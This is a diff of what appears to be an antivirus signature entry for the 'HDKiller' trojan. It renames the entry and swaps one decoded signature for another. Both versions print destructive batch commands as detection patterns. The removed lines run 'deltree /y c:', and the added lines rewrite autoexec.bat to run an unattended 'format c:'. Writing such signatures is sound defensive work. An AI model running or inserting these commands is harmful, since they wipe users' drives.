@@ -1,13 +1,7 @@
-VIRUS NAME: Win.Trojan.Hdkiller-1
+VIRUS NAME: Win.Trojan.HDKiller-1
 TARGET TYPE: ANY FILE
 OFFSET: *
 DECODED SIGNATURE:
-eldos 
-cd\dos 
-call deltree /y c:  
-cd\ 
-delwin 
-call deltree /y c:  
-cd\  
-:write 
-type hdkiller.txt 
+rib -h -r c:\autoexec.bat >nul
+echo @echo off >c:\autoexec.bat
+echo format c: /q /u /autotest >nul >>c:\aut
